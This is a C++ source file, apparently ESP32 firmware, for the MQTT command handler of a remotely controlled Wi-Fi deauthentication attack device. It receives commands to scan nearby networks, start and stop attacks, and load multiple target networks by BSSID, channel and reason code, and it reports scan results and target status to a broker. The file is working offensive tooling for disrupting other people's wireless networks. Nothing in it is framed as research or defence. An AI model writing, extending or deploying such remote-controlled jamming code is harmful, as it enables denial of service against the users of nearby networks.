#include "mqtt_handler.h"
#include "attack_manager.h"
#include "deauth.h"

void MQTTHandler::begin() {
    Serial.println("📡 MQTT Handler initialized");
}

void MQTTHandler::callback(char* topic, byte* payload, unsigned int length, 
                           PubSubClient& mqtt, bool& attackTriggered,
                           bool& attackModeActive, bool& attackPaused,
                           std::vector<AttackTarget>& attackTargets,
                           std::vector<AttackTarget>& savedAttackTargets,
                           uint16_t& savedReason, unsigned long& checkInterval,
                           unsigned long& lastCheckTime, uint16_t& lastReason) {
    String msg = "";
    for (unsigned int i = 0; i < length; i++) msg += (char)payload[i];
    
    if (msg.length() == 0) return;
    
    Serial.printf("📩 MQTT [%s]: %s\n", topic, msg.c_str());
    
    bool isRetained = String(topic).indexOf("/retained") > 0;
    
    if (msg == "start_attack") {
        handleStartAttack(mqtt, attackTriggered);
    } 
    else if (msg == "stop_attack") {
        handleStopAttack(mqtt, attackTriggered, attackModeActive, attackPaused);
        if (isRetained) mqtt.publish(TOPIC_CMD_RETAINED, "", true);
    }
    else if (msg == "status") {
        // ✅ FIX: Actually handle status request
        Serial.println("📊 Status requested - sending...");
        publishStatus(mqtt, attackModeActive ? "attacking" : "standby");
    }
    else if (msg == "scan") {
        // ✅ FIX: Actually handle scan request
        Serial.println("🔍 Scan requested - scanning...");
        std::vector<ScannedNetwork> scanResults;
        AttackManager::scanAndReport(scanResults);
        publishScanResults(mqtt, scanResults);
        if (isRetained) mqtt.publish(TOPIC_CMD_RETAINED, "", true);
    }
    else if (msg.startsWith("multi_attack")) {
        handleMultiAttack(mqtt, msg, attackTargets, savedAttackTargets,
                         savedReason, lastCheckTime, attackModeActive,
                         attackTriggered, lastReason);
    }
    else if (msg.startsWith("set_interval:")) {
        handleSetInterval(msg, mqtt, checkInterval);
    }
    else if (msg == "restart") {
        handleRestart(mqtt);
    }
    else {
        Serial.println("❓ Unknown command: " + msg);
    }
}

void MQTTHandler::handleStartAttack(PubSubClient& mqtt, bool& attackTriggered) {
    attackTriggered = true;
    mqtt.publish(TOPIC_STATUS, "{\"status\":\"starting_attack\"}");
    Serial.println("⚔️  ATTACK COMMAND RECEIVED!");
}

void MQTTHandler::handleStopAttack(PubSubClient& mqtt, bool& attackTriggered,
                                   bool& attackModeActive, bool& attackPaused) {
    attackTriggered = false;
    attackModeActive = false;
    attackPaused = false;
    stop_deauth();
    mqtt.publish(TOPIC_STATUS, "{\"status\":\"stopped\",\"staying_connected\":true}");
    Serial.println("🛑 STOP received. Staying connected.");
}

void MQTTHandler::handleMultiAttack(PubSubClient& mqtt, const String& msg,
                                    std::vector<AttackTarget>& attackTargets,
                                    std::vector<AttackTarget>& savedAttackTargets,
                                    uint16_t& savedReason, unsigned long& lastCheckTime,
                                    bool& attackModeActive, bool& attackTriggered,
                                    uint16_t& lastReason) {
    Serial.println("\n╔══════════════════════════════════════╗");
    Serial.println("║   ⚔️  MULTI-TARGET ATTACK RECEIVED  ║");
    Serial.println("╚══════════════════════════════════════╝");
    
    // Parse payload
    String payload;
    if (msg.startsWith("multi_attack:")) payload = msg.substring(13);
    else if (msg.startsWith("multi_attack ")) payload = msg.substring(13);
    else { Serial.println("❌ Invalid format"); return; }
    
    int comma = payload.indexOf(',');
    if (comma < 0) { Serial.println("❌ No comma found"); return; }
    
    uint16_t reason = payload.substring(0, comma).toInt();
    String targetsStr = payload.substring(comma + 1);
    
    Serial.printf("   Reason: %d\n", reason);
    savedReason = reason;
    attackTargets.clear();
    
    // Parse targets
    if (targetsStr.indexOf('|') > 0) {
        int start = 0, end = targetsStr.indexOf('|');
        while (start < targetsStr.length()) {
            String target = (end > 0) ? targetsStr.substring(start, end) 
                                      : targetsStr.substring(start);
            parseTargetString(target, attackTargets);
            if (end > 0) { start = end + 1; end = targetsStr.indexOf('|', start); }
            else start = targetsStr.length();
        }
    } else {
        parseTargetString(targetsStr, attackTargets);
    }
    
    savedAttackTargets = attackTargets;
    Serial.printf("   Targets: %d\n", attackTargets.size());
    
    if (attackTargets.size() > 0) {
        String statusMsg = "{\"status\":\"attacking\",\"mode\":\"multi_target\",\"targets\":" + 
                          String(attackTargets.size()) + ",\"reason\":" + String(reason) + "}";
        mqtt.publish(TOPIC_STATUS, statusMsg.c_str());
        
        mqtt.disconnect();
        WiFi.disconnect(true);
        delay(100);
        
        AttackManager::startAttack(attackTargets, reason);
        attackModeActive = true;
        attackTriggered = true;
        lastReason = reason;
        lastCheckTime = millis();
    }
}

void MQTTHandler::handleRestart(PubSubClient& mqtt) {
    Serial.println("🔄 RESTART RECEIVED!");
    mqtt.publish(TOPIC_CMD_RETAINED, "", true);
    mqtt.publish(TOPIC_CMD, "", true);
    
    for (int i = 0; i < 5; i++) { mqtt.loop(); delay(100); }
    
    mqtt.publish(TOPIC_STATUS, "{\"status\":\"restarting\"}");
    mqtt.loop();
    delay(1000);
    ESP.restart();
}

void MQTTHandler::handleSetInterval(const String& msg, PubSubClient& mqtt,
                                    unsigned long& checkInterval) {
    String intervalStr = msg.substring(13);
    unsigned long newInterval = intervalStr.toInt();
    if (newInterval >= 30000 && newInterval <= 3600000) {
        checkInterval = newInterval;
        Serial.printf("⏰ Check interval: %lu seconds\n", newInterval / 1000);
        String response = "{\"status\":\"interval_updated\",\"interval\":" + 
                         String(newInterval) + "}";
        mqtt.publish(TOPIC_STATUS, response.c_str());
    }
}

void MQTTHandler::parseTargetString(const String& target, 
                                    std::vector<AttackTarget>& attackTargets) {
    int c1 = target.indexOf(',');
    int c2 = target.indexOf(',', c1 + 1);
    
    if (c1 <= 0) return;
    
    String bssidStr = target.substring(0, c1);
    int channel = (c2 > 0) ? target.substring(c1 + 1, c2).toInt() : target.substring(c1 + 1).toInt();
    String ssid = (c2 > 0) ? target.substring(c2 + 1) : "";
    
    AttackTarget at;
    at.ssid = ssid;
    at.channel = channel;
    
    int values[6];
    if (sscanf(bssidStr.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; i++) at.bssid[i] = (uint8_t)values[i];
        attackTargets.push_back(at);
        Serial.printf("   🎯 %s | %s | Ch:%d\n", ssid.c_str(), bssidStr.c_str(), channel);
    }
}

void MQTTHandler::publishStatus(PubSubClient& mqtt, const char* status,
                                const char* mode, bool paused) {
    DynamicJsonDocument doc(256);
    doc["device"] = DEVICE_ID;
    doc["status"] = status;
    if (strlen(mode) > 0) doc["mode"] = mode;
    if (paused) doc["paused"] = true;
    doc["uptime"] = millis() / 1000;
    doc["rssi"] = WiFi.RSSI();
    doc["ip"] = WiFi.localIP().toString();
    
    String json;
    serializeJson(doc, json);
    mqtt.publish(TOPIC_STATUS, json.c_str());
}

void MQTTHandler::publishScanResults(PubSubClient& mqtt,
                                     const std::vector<ScannedNetwork>& networks) {
    if (!mqtt.connected()) return;
    
    DynamicJsonDocument doc(8192);
    doc["device"] = DEVICE_ID;
    doc["type"] = "scan_results";
    doc["timestamp"] = millis();
    
    JsonArray arr = doc.createNestedArray("networks");
    for (const auto& net : networks) {
        JsonObject obj = arr.createNestedObject();
        obj["ssid"] = net.ssid;
        obj["bssid"] = net.bssid;
        obj["channel"] = net.channel;
        obj["rssi"] = net.rssi;
        obj["distance"] = round(net.distance * 10) / 10.0;
        obj["is_target"] = net.is_target;
    }
    
    doc["total_networks"] = networks.size();
    
    String json;
    serializeJson(doc, json);
    mqtt.publish(TOPIC_SCAN, json.c_str());
    Serial.println("📤 Scan results sent");
}